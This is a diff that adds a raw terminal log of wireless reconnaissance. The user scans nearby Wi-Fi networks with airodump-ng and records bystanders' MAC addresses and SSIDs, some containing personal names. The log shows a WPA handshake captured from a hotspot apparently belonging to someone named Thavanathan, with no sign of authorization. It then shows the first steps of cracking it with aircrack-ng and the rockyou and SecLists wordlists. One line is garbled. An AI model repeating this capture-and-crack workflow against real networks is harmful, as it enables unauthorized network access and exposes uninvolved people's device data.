@@ -1,0 +1,437 @@
+k-rakeshan@Hellboy:~$ sudo airmon-ng 
+
+PHY	Interface	Driver		Chipset
+
+phy0	wlp2s0mon	rtw89_8852be	Realtek Semiconductor Co., Ltd. RTL8852BE PCIe 802.11ax Wireless Network Controller
+
+k-rakeshan@Hellboy:~$ sudo airodump-ng wlp2s0mon
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+ CH 11 ][ Elapsed: 1 min ][ 2026-05-16 12:26 
+
+ BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID
+
+ C2:8A:60:90:AC:50  -88        2        0    0  11   65   WPA2 CCMP   PSK  WIFIBRG001300281d01IPC035                                                                                         
+ 98:A9:42:09:E6:0D  -91        1        0    0   6  130   WPA2 CCMP   PSK  SHKH                                                                                                              
+ 4A:A4:FD:C2:FE:C2  -92        2        0    0  11   65   WPA2 CCMP   PSK  WIFIBRG001300281d01IPC053                                                                                         
+ CA:0D:E2:E0:FA:7C  -87        1      351    0   6  130   WPA2 CCMP   PSK  iPhone                                                                                                            
+ 4A:A4:FD:C8:79:C6  -91        4        0    0  11   65   WPA2 CCMP   PSK  WIFIBRG001300281d01IPC094                                                                                         
+ A6:8E:DC:82:EB:7B  -44       86      208   11   6  130   WPA2 CCMP   PSK  Thavanathan’s iPhone                                                                                            
+ D8:42:F7:E2:21:7B  -82       90        4    0  10  270   WPA2 CCMP   PSK  Dialog 4G 379                                                                                                     
+ B8:27:C5:49:84:4C  -84       67        3    0  10  270   WPA2 CCMP   PSK  Dialog 4G 44C                                                                                                     
+ BA:4D:43:17:49:3D  -83       23        0    0   3   65   WPA2 CCMP   PSK  EZVIZ_BA8983061                                                                                                   
+ 98:A9:42:AB:6D:DB  -89        9        0    0   7  130   WPA2 CCMP   PSK  Dialog 4G 547                                                                                                     
+ 7C:11:CB:07:F3:03  -74       90       12    0   6  130   WPA2 CCMP   PSK  Dialog 4G                                                                                                         
+ 98:A9:42:17:FE:C1  -78       70        0    0   7  130   WPA2 CCMP   PSK  Dialog 4G 777                                                                                                     
+ 9E:02:9F:A9:99:85  -66       81       18    0   1  130   WPA2 CCMP   PSK  Boss                                                                                                              
+
+ BSSID              STATION            PWR    Rate    Lost   Frames  Notes  Probes
+
+ CA:0D:E2:E0:FA:7C  08:F9:7E:DD:E2:41  -89    0 - 6e    20        3                                                                                                                           
+ CA:0D:E2:E0:FA:7C  D2:67:74:E3:DF:23  -75    0 -24e    64      359                                                                                                                           
+ A6:8E:DC:82:EB:7B  14:5A:FC:81:7E:1D  -42    6e- 6e    15      157                                                                                                                           
+ A6:8E:DC:82:EB:7B  24:EB:16:56:E1:CC  -66   24e- 6e    57      210         Thavanathan’s iPhone                                                                                            
+ D8:42:F7:E2:21:7B  38:54:F5:11:75:43  -66    0 - 1      0        3                                                                                                                           
+ B8:27:C5:49:84:4C  46:0F:56:E0:5D:04  -84    0 - 6      0        1                                                                                                                           
+ B8:27:C5:49:84:4C  C0:BF:BE:A3:7F:1E  -76    0 - 1e    13       10                                                                                                                           
+ (not associated)   16:F1:EB:29:88:65  -68    0 - 1      0        1                                                                                                                           
+ (not associated)   6A:35:47:E2:05:C1  -90    0 - 1      0        3                                                                                                                           
+ (not associated)   8A:D3:F4:C0:FF:84  -61    0 - 1      0        7         Note 17                                                                                                           
+ (not associated)   CC:5E:F8:13:C3:5D  -54    0 - 1      0        5                                                                                                                           
+ (not associated)   82:CC:89:BF:87:9C  -78    0 - 1      0        2                                                                                                                           
+ (not associated)   42:D2:D6:B5:90:C9  -92    0 - 1      0        6                                                                                                                           
+ 7C:11:CB:07:F3:03  9E:61:BC:3F:E8:81  -91    0 - 1      0        4                                                                                                                           
+ 9E:02:9F:A9:99:85  F0:77:C3:FF:15:45  -49    1e- 6e     0       19         Boss                                                                                                              
+ 9E:02:9F:A9:99:85  D0:57:7E:A6:B7:F1  -65   24e- 6e     0       11                                                                                                                           
+Quitting...
+k-rakeshan@Hellboy:~$ sudo airodump-ng wlp2s0mon --output-format csv,kismet --write wifi_recon
+
+
+
+
+
+ CH  5 ][ Elapsed: 48 s ][ 2026-05-16 12:27 
+
+ BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID
+
+ 4E:A8:A8:1D:FA:AF  -84        4        0    0   1   54   WPA3 CCMP   SAE  Redmi A5                                                                                                          
+ 98:A9:42:AB:6D:DB  -90        6        0    0   7  130   WPA2 CCMP   PSK  Dialog 4G 547                                                                                                     
+ 4A:A4:FD:C8:79:C6  -92        2        0    0  11   65   WPA2 CCMP   PSK  WIFIBRG001300281d01IPC094                                                                                         
+ BA:4D:43:17:49:3D  -85       17        0    0   3   65   WPA2 CCMP   PSK  EZVIZ_BA8983061                                                                                                   
+ CA:0D:E2:E0:FA:7C  -88        8       33    0   6  130   WPA2 CCMP   PSK  iPhone                                                                                                            
+ 4A:A4:FD:C2:FE:C2  -89        5        0    0  11   65   WPA2 CCMP   PSK  WIFIBRG001300281d01IPC053                                                                                         
+ B8:27:C5:49:84:4C  -84       50        2    0  10  270   WPA2 CCMP   PSK  Dialog 4G 44C                                                                                                     
+ A6:8E:DC:82:EB:7B  -47       90       50   12   6  130   WPA2 CCMP   PSK  Thavanathan’s iPhone                                                                                            
+ 98:A9:42:17:FE:C1  -77       55        1    0   7  130   WPA2 CCMP   PSK  Dialog 4G 777                                                                                                     
+ 7C:11:CB:07:F3:03  -78       83        7    0   6  130   WPA2 CCMP   PSK  Dialog 4G                                                                                                         
+ 9E:02:9F:A9:99:85  -80       53      137    2   1  130   WPA2 CCMP   PSK  Boss                                                                                                              
+ D8:42:F7:E2:21:7B  -80       65        7    0  10  270   WPA2 CCMP   PSK  Dialog 4G 379                                                                                                     
+
+ BSSID              STATION            PWR    Rate    Lost   Frames  Notes  Probes
+
+ (not associated)   26:5B:37:17:5A:56  -42    0 - 1      0        2                                                                                                                           
+ (not associated)   BA:99:2E:23:37:67  -40    0 - 1      0        2                                                                                                                           
+ (not associated)   22:F9:90:37:46:C1  -73    0 - 1      0        2                                                                                                                           
+ (not associated)   E6:09:CA:4B:8F:90  -64    0 - 1      0        4                                                                                                                           
+ (not associated)   AE:77:3A:74:B8:91  -79    0 - 1      0        2                                                                                                                           
+ (not associated)   4C:75:25:27:B9:D4  -92    0 - 1      0        1         Show what you have                                                                                                
+ (not associated)   8A:BB:85:12:B3:5F  -85    0 - 1      0        1                                                                                                                           
+ (not associated)   42:D2:D6:B5:90:C9  -84    0 - 1    225        3                                                                                                                           
+ (not associated)   9A:32:A5:B3:5A:DC  -87    0 - 1      0        1                                                                                                                           
+ (not associated)   8A:D3:F4:9A:A9:A3  -76    0 - 1      0        3                                                                                                                           
+ (not associated)   D2:24:01:F3:12:3B  -83    0 - 1      0        1                                                                                                                           
+ CA:0D:E2:E0:FA:7C  08:F9:7E:DD:E2:41  -88    0 - 6e     0        1                                                                                                                           
+ CA:0D:E2:E0:FA:7C  D2:67:74:E3:DF:23  -74    0 -24e   162       48                                                                                                                           
+ B8:27:C5:49:84:4C  C0:BF:BE:A3:7F:1E  -68    0 - 1e    14       11                                                                                                                           
+ A6:8E:DC:82:EB:7B  14:5A:FC:81:7E:1D  -41    6e- 6e     1       10                                                                                                                           
+ A6:8E:DC:82:EB:7B  24:EB:16:56:E1:CC  -59   24e-24e     0       46                                                                                                                           
+ 98:A9:42:17:FE:C1  38:BE:AB:98:13:DF  -89    1e- 6      0        2                                                                                                                           
+ 7C:11:CB:07:F3:03  9E:61:BC:3F:E8:81  -91    0 - 1      0        3                                                                                                                           
+ 9E:02:9F:A9:99:85  D0:57:7E:A6:B7:F1  -60   24e-24e   665      137                                                                                                                           
+ 9E:02:9F:A9:99:85  F0:77:C3:FF:15:45  -44    1e- 5e     0       10         Boss                                                                                                              
+Quitting...
+k-rakeshan@Hellboy:~$ sudo airodump-ng wlp2s0mon --output-format csv,kismet --write wifi_recon
+
+
+ CH 10 ][ Elapsed: 4 mins ][ 2026-05-16 12:36 
+
+ BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID
+
+ 50:9B:94:EA:27:4A  -85        2        0    0   1  135   WPA2 CCMP   PSK  DDPAI_Z40_274A                                                                                                    
+ C2:E0:7D:6D:7A:E0  -89        2        0    0   6  130   WPA2 CCMP   PSK  RizkAhamed                                                                                                        
+ 60:A4:D0:DE:72:12  -87        9        0    0   6   65   WPA2 CCMP   PSK  AndroidAP                                                                                                         
+ 0C:8F:FF:28:14:7C  -93        2        1    0  10  270   WPA2 CCMP   PSK  SLT-4G-EAFC                                                                                                       
+ FC:3F:FC:51:05:69  -92        2        0    0   6  130   WPA2 CCMP   PSK  Dialog 4G 385                                                                                                     
+Quitting...0:AC:50  -91        9        0    0  11   65   WPA2 CCMP   PSK  WIFIBRG001300281d01IPC035                                                                                         
+ C2:8A:60:90:AC:50  -91        9        0    0  11   65   WPA2 CCMP   PSK  WIFIBRG001300281d01IPC035                                                                                         
+ 98:A9:42:09:E6:0D  -90       31        1    0   6  130   WPA2 CCMP   PSK  SHKH                                                                                                              
+ D8:42:F7:B2:1D:B7   -1        0        5    0   7   -1   WPA              <length:  0>                                                                                                      
+ 4A:A4:FD:C2:FE:C2  -88        5        1    0  11   65   WPA2 CCMP   PSK  WIFIBRG001300281d01IPC053                                                                                         
+ 4A:A4:FD:C8:79:C6  -90       37        0    0  11   65   WPA2 CCMP   PSK  WIFIBRG001300281d01IPC094                                                                                         
+ CA:0D:E2:E0:FA:7C  -88       36     1162    0   6  130   WPA2 CCMP   PSK  iPhone                                                                                                            
+ B8:27:C5:49:84:4C  -79      327       13    0  10  270   WPA2 CCMP   PSK  Dialog 4G 44C                                                                                                     
+ D8:42:F7:E2:21:7B  -79      431       32    0  10  270   WPA2 CCMP   PSK  Dialog 4G 379                                                                                                     
+ BA:4D:43:17:49:3D  -85      119        0    0   3   65   WPA2 CCMP   PSK  EZVIZ_BA8983061                                                                                                   
+ BA:3D:EB:6D:12:5C  -71      399      184    0   6  180   OPN              Redmi A1+                                                                                                         
+ A6:8E:DC:82:EB:7B  -51      424      618    0   6  130   WPA2 CCMP   PSK  Thavanathan’s iPhone                                                                                            
+ 98:A9:42:17:FE:C1  -80      267       16    0   7  130   WPA2 CCMP   PSK  Dialog 4G 777                                                                                                     
+ 9E:02:9F:A9:99:85  -66      337       41    0   1  130   WPA2 CCMP   PSK  Boss                                                                                                              
+ 7C:11:CB:07:F3:03  -76      434       39    0   6  130   WPA2 CCMP   PSK  Dialog 4G                                                                                                         
+
+ BSSID              STATION            PWR    Rate    Lost   Frames  Notes  Probes
+
+ D8:42:F7:B2:1D:B7  B8:4D:43:17:44:AC  -85    0 - 1e     0        5                                                                                                                           
+ CA:0D:E2:E0:FA:7C  08:F9:7E:DD:E2:41  -86    0 -11      0       67                                                                                                                           
+ CA:0D:E2:E0:FA:7C  D2:67:74:E3:DF:23  -73    0 -24     19     1211                                                                                                                           
+ (not associated)   E6:AB:AC:CB:41:93  -65    0 - 1      0        8                                                                                                                           
+ (not associated)   AE:1D:D1:6A:A3:22  -91    0 - 1      0        3                                                                                                                           
+ (not associated)   02:BA:29:04:22:8D  -69    0 - 1      0        1                                                                                                                           
+ (not associated)   7E:E4:6B:75:B1:24  -64    0 - 1      0        2                                                                                                                           
+ (not associated)   2A:1B:A1:00:17:05  -53    0 - 1      0        1                                                                                                                           
+ (not associated)   52:A7:BE:6E:BF:5D  -75    0 - 1      0        2                                                                                                                           
+ (not associated)   C0:8A:60:90:AC:50  -89    0 - 1      0        1                                                                                                                           
+ (not associated)   E6:0D:0A:75:21:5A  -85    0 - 1      0        2                                                                                                                           
+ (not associated)   26:E7:D3:C2:8B:CE  -90    0 - 1      0        1         Galaxy A06 5988                                                                                                   
+ (not associated)   E2:D3:00:05:AD:C2  -86    0 - 1      0        1         Galaxy A03 0685                                                                                                   
+k-rakeshan@Hellboy:~$ sudo airodump-ng --channel 6 wlp2s0mon --output-format csv,kismet --write wifi_recon
+
+
+ CH  6 ][ Elapsed: 1 min ][ 2026-05-16 12:38 ][ enabled AP selection
+
+ BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID
+
+ 2C:05:47:F1:F8:67  -89   6        2        0    0   6   65   WPA2 CCMP   PSK  70mai_d06_f867                                                                                                
+ FC:3F:FC:51:05:69  -90   3        3        0    0   6  130   WPA2 CCMP   PSK  Dialog 4G 385                                                                                                 
+ B2:1C:A6:33:5B:AD  -89   3        7        0    0   6  180   WPA2 CCMP   PSK  Galaxy A24 2263                                                                                               
+ D8:42:F7:0E:E1:9C   -1   0        0        0    0   6   -1                    <length:  0>                                                                                                  
+ FC:3F:FC:91:80:C0  -91   0        2        0    0   6  130   WPA2 CCMP   PSK  Dialog 4G 192                                                                                                 
+ 5C:A0:01:AA:DC:FC   -1   0        0        0    0  -1   -1                    <length:  0>                                                                                                  
+ C2:E0:7D:6D:7A:E0  -93   0        0        0    0   6  130   WPA2 CCMP   PSK  RizkAhamed                                                                                                    
+ 00:25:00:FF:94:73   -1   0        0        0    0  -1   -1                    <length:  0>                                                                                                  
+ 60:A4:D0:DE:72:12  -91   0       60        0    0   6   65   WPA2 CCMP   PSK  AndroidAP                                                                                                     
+ CA:0D:E2:E0:FA:7C  -88   6       77     3452    0   6  130   WPA2 CCMP   PSK  iPhone                                                                                                        
+ 98:A9:42:09:E6:0D  -88  16      165        0    0   6  130   WPA2 CCMP   PSK  SHKH                                                                                                          
+ 98:A9:42:17:FE:C1  -80  26      243        2    0   7  130   WPA2 CCMP   PSK  Dialog 4G 777                                                                                                 
+ BA:3D:EB:6D:12:5C  -79  71      490     2490   20   6  180   OPN              Redmi A1+                                                                                                     
+ A6:8E:DC:82:EB:7B  -47  16      664     8588  158   6  130   WPA2 CCMP   PSK  Thavanathan’s iPhone                                                                                        
+ 7C:11:CB:07:F3:03  -82  66      610       63    0   6  130   WPA2 CCMP   PSK  Dialog 4G                                                                                                     
+
+ BSSID              STATION            PWR    Rate    Lost   Frames  Notes  Probes
+
+ D8:42:F7:0E:E1:9C  E0:E2:58:BF:53:DD  -93    0 - 1e     0       12                                                                                                                           
+ 5C:A0:01:AA:DC:FC  50:3D:D1:C6:ED:BB  -91    0 - 6      0        3                                                                                                                           
+ 00:25:00:FF:94:73  32:82:38:06:B5:02  -88    0 -12      0        6                                                                                                                           
+ (not associated)   FE:CB:91:72:CB:D0  -91    0 - 1      0        1                                                                                                                           
+ (not associated)   46:A9:38:E3:BA:05  -62    0 - 1      0        2                                                                                                                           
+ (not associated)   C0:2E:DF:AA:0B:2B  -56    0 - 1      0        6                                                                                                                           
+ (not associated)   06:13:16:48:FF:FC  -75    0 - 1      0        4                                                                                                                           
+ (not associated)   3E:9D:D8:2C:E3:CB  -80    0 - 1      0        1                                                                                                                           
+ (not associated)   F0:77:C3:FF:15:45  -51    0 - 5      0        1         Boss                                                                                                              
+ (not associated)   82:C7:FB:F8:7D:2D  -82    0 - 1      0        2                                                                                                                           
+ (not associated)   6A:C6:04:62:44:EF  -76    0 - 1      0        1                                                                                                                           
+ 60:A4:D0:DE:72:12  B0:BE:83:7E:17:03  -90    0 - 1      0        2                                                                                                                           
+ CA:0D:E2:E0:FA:7C  08:F9:7E:DD:E2:41  -89    0 - 6e     9       93                                                                                                                           
+ CA:0D:E2:E0:FA:7C  D2:67:74:E3:DF:23  -75    0 -24e     8     3574                                                                                                                           
+ 98:A9:42:17:FE:C1  38:BE:AB:98:13:DF  -87    0 - 1e     0        1                                                                                                                           
+ BA:3D:EB:6D:12:5C  BA:3D:EB:6D:12:5C  -78    0 -24e     0        1                                                                                                                           
+ BA:3D:EB:6D:12:5C  A6:BC:88:35:CC:FA  -71   24e- 1e    38     3423                                                                                                                           
+Quitting...
+k-rakeshan@Hellboy:~$ sudo airodump-ng --channel 6 wlp2s0mon --output-format csv,kismet --write wifi_recon
+
+
+ CH  6 ][ Elapsed: 5 mins ][ 2026-05-16 12:43 ][ WPA handshake: A6:8E:DC:82:EB:7B 
+
+ BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID
+
+ FC:98:16:2C:ED:AE  -89   0        3        0    0   6   65   WPA2 CCMP   PSK  Smartphone_connect_2cedae                                                                                     
+ 98:A9:42:17:BA:0E  -93   0        2        1    0   6  130   WPA2 CCMP   PSK  Dialog 4G 574                                                                                                 
+ 24:EB:16:56:E1:CC   -1   0        0       26    0   6   -1   OPN              <length:  0>                                                                                                  
+ FC:3F:FC:91:80:C0  -91   0        4        0    0   6  130   WPA2 CCMP   PSK  Dialog 4G 192                                                                                                 
+ FC:3F:FC:51:05:69  -92   0       40        0    0   6  130   WPA2 CCMP   PSK  Dialog 4G 385                                                                                                 
+ B8:27:C5:49:84:4C   -1   0        0        9    0   6   -1   WPA              <length:  0>                                                                                                  
+ 98:A9:42:09:E6:0D  -88  10      574        5    0   6  130   WPA2 CCMP   PSK  SHKH                                                                                                          
+ 60:A4:D0:DE:72:12  -89  33      477        4    0   6   65   WPA2 CCMP   PSK  AndroidAP                                                                                                     
+ 00:25:00:FF:94:73   -1   0        0        0    0  -1   -1                    <length:  0>                                                                                                  
+ C2:E0:7D:6D:7A:E0  -92   0       17        0    0   6  130   WPA2 CCMP   PSK  RizkAhamed                                                                                                    
+ 98:A9:42:17:FE:C1  -81  24      626        2    0   7  130   WPA2 CCMP   PSK  Dialog 4G 777                                                                                                 
+ 7C:11:CB:07:F3:03  -76  73     2401      233    0   6  130   WPA2 CCMP   PSK  Dialog 4G                                                                                                     
+ CA:0D:E2:E0:FA:7C  -85  19      311     9023    1   6  130   WPA2 CCMP   PSK  iPhone                                                                                                        
+ BA:3D:EB:6D:12:5C  -85   2     1987    10588   27   6  180   OPN              Redmi A1+                                                                                                     
+ A6:8E:DC:82:EB:7B  -50  51     2793    86279  399   6  130   WPA2 CCMP   PSK  Thavanathan’s iPhone                                                                                        
+
+ BSSID              STATION            PWR    Rate    Lost   Frames  Notes  Probes
+
+ B8:27:C5:49:84:4C  C0:BF:BE:A3:7F:1E  -79    0 - 6e     5       19         wenu@s                                                                                                            
+ (not associated)   62:9E:48:BA:43:97  -66    0 - 1      0        2                                                                                                                           
+ (not associated)   6E:81:95:A6:BA:D9  -88    0 - 1      0        1                                                                                                                           
+ (not associated)   3E:BA:F8:7E:F1:52  -78    0 - 1      0        1                                                                                                                           
+ (not associated)   FE:B5:FC:91:02:B7  -80    0 - 1      0        1                                                                                                                           
+ (not associated)   0A:75:EC:1F:FD:F3  -81    0 - 1      0        2                                                                                                                           
+ (not associated)   EA:9E:D1:93:9A:12  -91    0 - 1      0        1                                                                                                                           
+ (not associated)   76:6D:06:07:2A:9C  -75    0 - 1      0        2                                                                                                                           
+ (not associated)   5A:D5:A6:0C:1F:8A  -90    0 - 1      0        1                                                                                                                           
+ (not associated)   F2:E6:40:03:B3:A1  -82    0 - 1      0        4                                                                                                                           
+ (not associated)   72:6A:A6:FF:9B:6D  -64    0 - 1      0        4                                                                                                                           
+ (not associated)   DE:45:ED:EF:A5:B1  -85    0 - 1      0        2                                                                                                                           
+ (not associated)   4A:5F:DD:52:1A:67  -61    0 - 1      0        2                                                                                                                           
+ (not associated)   9E:B1:A2:29:12:F8  -85    0 - 1      0        1                                                                                                                           
+ (not associated)   82:D0:A7:1F:3B:3C  -80    0 - 1      0        1                                                                                                                           
+ (not associated)   86:CA:16:71:71:64  -63    0 - 1      0        1                                                                                                                           
+ (not associated)   F2:CA:46:0B:88:10  -71    0 - 1      0        2                                                                                                                           
+Quitting...
+k-rakeshan@Hellboy:~$ sudo airodump-ng wlp2s0mon --output-format csv,kismet --write wifi_recon
+
+
+ CH 11 ][ Elapsed: 1 min ][ 2026-05-16 12:45 
+
+ BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID
+
+ C2:E0:7D:6D:7A:E0  -90        3        0    0   6  130   WPA2 CCMP   PSK  RizkAhamed                                                                                                        
+ C2:8A:60:90:AC:50  -88        5        0    0  11   65   WPA2 CCMP   PSK  WIFIBRG001300281d01IPC035                                                                                         
+ 98:A9:42:09:E6:0D  -90       14        0    0   6  130   WPA2 CCMP   PSK  SHKH                                                                                                              
+ 98:A9:42:AB:6D:DB  -89        5        0    0   7  130   WPA2 CCMP   PSK  Dialog 4G 547                                                                                                     
+ CA:0D:E2:E0:FA:7C  -89        8       49    0   6  130   WPA2 CCMP   PSK  iPhone                                                                                                            
+ 60:A4:D0:DE:72:12  -90       11        0    0   6   65   WPA2 CCMP   PSK  AndroidAP                                                                                                         
+ 4A:A4:FD:C8:79:C6  -92       12        0    0  11   65   WPA2 CCMP   PSK  WIFIBRG001300281d01IPC094                                                                                         
+ 4A:A4:FD:C2:FE:C2  -86       15        1    0  11   65   WPA2 CCMP   PSK  WIFIBRG001300281d01IPC053                                                                                         
+ B8:27:C5:49:84:4C  -79      141        3    0  10  270   WPA2 CCMP   PSK  Dialog 4G 44C                                                                                                     
+ D8:42:F7:E2:21:7B  -80      138       10    0  10  270   WPA2 CCMP   PSK  Dialog 4G 379                                                                                                     
+ BA:4D:43:17:49:3D  -87       40        0    0   3   65   WPA2 CCMP   PSK  EZVIZ_BA8983061                                                                                                   
+ 98:A9:42:17:FE:C1  -78       85        4    0   7  130   WPA2 CCMP   PSK  Dialog 4G 777                                                                                                     
+ 9E:02:9F:A9:99:85  -66      106       22    0   1  130   WPA2 CCMP   PSK  Boss                                                                                                              
+ 7C:11:CB:07:F3:03  -81      162       31    0   6  130   WPA2 CCMP   PSK  Dialog 4G                                                                                                         
+ BA:3D:EB:6D:12:5C  -76       97      141    0   6  180   OPN              Redmi A1+                                                                                                         
+ A6:8E:DC:82:EB:7B  -50      180     1257    0   6  130   WPA2 CCMP   PSK  Thavanathan’s iPhone                                                                                            
+
+ BSSID              STATION            PWR    Rate    Lost   Frames  Notes  Probes
+
+ CA:0D:E2:E0:FA:7C  D2:67:74:E3:DF:23  -76    0 -12e     6       74                                                                                                                           
+ CA:0D:E2:E0:FA:7C  08:F9:7E:DD:E2:41  -89    0 - 6e     0        7                                                                                                                           
+ B8:27:C5:49:84:4C  C0:BF:BE:A3:7F:1E  -82    0 - 1e     0        4                                                                                                                           
+ B8:27:C5:49:84:4C  46:0F:56:E0:5D:04  -84    0 - 6      0        4                                                                                                                           
+ D8:42:F7:E2:21:7B  C0:2E:DF:AA:0B:2B  -53    0 - 2      0        1                                                                                                                           
+ D8:42:F7:E2:21:7B  38:54:F5:11:75:43  -65    0 - 1      0       10                                                                                                                           
+ (not associated)   0E:29:A2:21:FD:5F  -67    0 - 1      0        6                                                                                                                           
+ (not associated)   C2:23:A5:55:43:90  -81    0 - 1      0        1                                                                                                                           
+ (not associated)   82:9F:C5:F3:AA:65  -89    0 - 1      0        2                                                                                                                           
+ (not associated)   1E:A4:AC:19:7C:A9  -67    0 - 1      0        4                                                                                                                           
+ (not associated)   C0:8A:60:90:AC:50  -95    0 - 1      0        1                                                                                                                           
+ (not associated)   32:68:D5:2D:9E:D5  -81    0 - 1      0        1                                                                                                                           
+ (not associated)   4C:75:25:27:B9:D4  -92    0 - 1      0        2         Show what you have                                                                                                
+ (not associated)   62:48:8B:9E:9D:CE  -70    0 - 1      0        1                                                                                                                           
+ (not associated)   DA:F5:2C:D3:B0:5A  -89    0 - 1      0        1                                                                                                                           
+ (not associated)   02:00:00:00:00:00  -76    0 - 1      0        3                                                                                                                           
+Quitting...
+k-rakeshan@Hellboy:~$ sudo airodump-ng --channel 6 wlp2s0mon --output-format csv,kismet --write wifi_recon
+
+
+ CH  6 ][ Elapsed: 9 mins ][ 2026-05-16 12:54 ][ Decloak: 24:EB:16:56:E1:CC 
+
+ BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID
+
+ 0C:8F:FF:28:14:7C  -91   0        5        0    0   6  270   WPA2 CCMP   PSK  SLT-4G-EAFC                                                                                                   
+ 24:EB:16:56:E1:CC   -1   0        0      142    0   6   -1   OPN              <length:  0>                                                                                                  
+ 22:7C:A4:7D:D9:64  -64  96     1877        6    0   6   65   WPA2 CCMP   PSK  Galaxy M0298c8                                                                                                
+ 32:A7:F8:58:28:A0  -92   0        2        0    0   6  180   WPA2 CCMP   PSK  redmi note 12                                                                                                 
+ 5C:A0:01:AA:DC:FC   -1   0        0        0    0  -1   -1                    <length:  0>                                                                                                  
+ B8:27:C5:49:84:4C   -1   0        0        4    0   6   -1   WPA              <length:  0>                                                                                                  
+ FC:3F:FC:91:80:C0  -93   0       10        0    0   6  130   WPA2 CCMP   PSK  Dialog 4G 192                                                                                                 
+ 00:25:00:FF:94:73   -1   0        0        0    0  -1   -1                    <length:  0>                                                                                                  
+ D8:42:F7:0E:E1:9C   -1   0        0        0    0   6   -1                    <length:  0>                                                                                                  
+ 98:A9:42:09:E6:0D  -90  31      568        0    0   6  130   WPA2 CCMP   PSK  SHKH                                                                                                          
+ FC:3F:FC:51:05:69  -92   1       29        0    0   6  130   WPA2 CCMP   PSK  Dialog 4G 385                                                                                                 
+ C2:E0:7D:6D:7A:E0  -91   4       36        0    0   6  130   WPA2 CCMP   PSK  RizkAhamed                                                                                                    
+ CA:0D:E2:E0:FA:7C  -85  57      645      430    0   6  130   WPA2 CCMP   PSK  iPhone                                                                                                        
+ 98:A9:42:17:FE:C1  -82  28      465        7    0   7  130   WPA2 CCMP   PSK  Dialog 4G 777                                                                                                 
+ 60:A4:D0:DE:72:12  -90   0      247        0    0   6   65   WPA2 CCMP   PSK  AndroidAP                                                                                                     
+ 7C:11:CB:07:F3:03  -76  82     3659      442    0   6  130   WPA2 CCMP   PSK  Dialog 4G                                                                                                     
+ BA:3D:EB:6D:12:5C  -78 100     3354    11730    0   6  180   OPN              Redmi A1+                                                                                                     
+ A6:8E:DC:82:EB:7B  -53 100     4315    23811    3   6  130   WPA2 CCMP   PSK  Thavanathan’s iPhone                                                                                        
+
+ BSSID              STATION            PWR    Rate    Lost   Frames  Notes  Probes
+
+ 5C:A0:01:AA:DC:FC  50:3D:D1:C6:ED:BB  -97    0 - 6      0        2                                                                                                                           
+ B8:27:C5:49:84:4C  C0:BF:BE:A3:7F:1E  -80    0 - 6e     0        7         wenu@s                                                                                                            
+ 00:25:00:FF:94:73  76:54:8D:A6:BA:BB  -88    0 -12      0        1                                                                                                                           
+ D8:42:F7:0E:E1:9C  AC:DF:A1:BC:F6:93  -92    0 - 1      0      357                                                                                                                           
+ C2:E0:7D:6D:7A:E0  00:08:22:70:16:4C  -92    0 - 1      0        1                                                                                                                           
+ (not associated)   0A:DF:8C:0E:F9:C2  -84    0 - 1      0        2                                                                                                                           
+ (not associated)   CA:98:B9:93:3E:13  -63    0 - 1      0        1                                                                                                                           
+ (not associated)   32:30:47:E1:1D:22  -87    0 - 1      0        2                                                                                                                           
+ (not associated)   62:0B:11:D4:58:08  -84    0 - 1      0        1                                                                                                                           
+ (not associated)   B2:8C:BA:30:F2:03  -73    0 - 1      0        2                                                                                                                           
+ (not associated)   EA:F0:F9:54:64:B9  -84    0 - 1      0        1                                                                                                                           
+ (not associated)   B2:54:82:D1:BE:52  -92    0 - 1      0        1                                                                                                                           
+ (not associated)   3A:CD:B8:97:F7:62  -71    0 - 1      0        2                                                                                                                           
+ (not associated)   7A:C7:5F:48:59:38  -87    0 - 1      0        3                                                                                                                           
+k-rakeshan@Hellboy:~$ sudo airodump-ng --bssid A6:8E:DC:82:EB:7B --channel 6 wlp2s0mon --write capture wlp2s0mon
+"airodump-ng --help" for help.
+k-rakeshan@Hellboy:~$ sudo airodump-ng --bssid A6:8E:DC:82:EB:7B --channel 6 wlp2s0mon --write capture
+12:56:33  Created capture file "capture-01.cap".
+
+
+ CH  6 ][ Elapsed: 36 s ][ 2026-05-16 12:57 ][ WPA handshake: A6:8E:DC:82:EB:7B 
+
+ BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID
+
+ A6:8E:DC:82:EB:7B  -52   0      322     1406   58   6  130   WPA2 CCMP   PSK  Thavanathan’s iPhone                                                                                        
+
+ BSSID              STATION            PWR    Rate    Lost   Frames  Notes  Probes
+
+ A6:8E:DC:82:EB:7B  14:5A:FC:81:7E:1D  -37    6e- 6e     1     1133                                                                                                                           
+ A6:8E:DC:82:EB:7B  24:EB:16:56:E1:CC  -76    1e- 1e  33149     3124  EAPOL                                                                                                                    
+Quitting...
+k-rakeshan@Hellboy:~$ aircrack-ng capture-01.cap -w /usr/share/
+Display all 333 possibilities? (y or n)
+k-rakeshan@Hellboy:~$ aircrack-ng capture-01.cap -w ./
+Display all 142 possibilities? (y or n)
+k-rakeshan@Hellboy:~$ aircrack-ng capture-01.cap -w ./
+Display all 142 possibilities? (y or n)
+k-rakeshan@Hellboy:~$ aircrack-ng capture-01.cap -w ./
+Display all 142 possibilities? (y or n)
+k-rakeshan@Hellboy:~$ aircrack-ng capture-01.cap -w ./Kali-Shared-Folder/
+Axiom.apk               Mini-Project-OSS/       onelistforallshort.txt  protected.txt           SecLists/               Secret_Vault.zip        
+flag.txt                onelistforallmicro.txt  picoCtf/                protected.zip           Secret_Vault.txt        
+k-rakeshan@Hellboy:~$ aircrack-ng capture-01.cap -w ./Kali-Shared-Folder/Sec
+SecLists/         Secret_Vault.txt  Secret_Vault.zip  
+k-rakeshan@Hellboy:~$ aircrack-ng capture-01.cap -w ./Kali-Shared-Folder/SecLists/
+Ai/               CONTRIBUTING.md   Discovery/        .git/             .github/          LICENSE           Passwords/        Payloads/         rockyou.txt       Web-Shells/
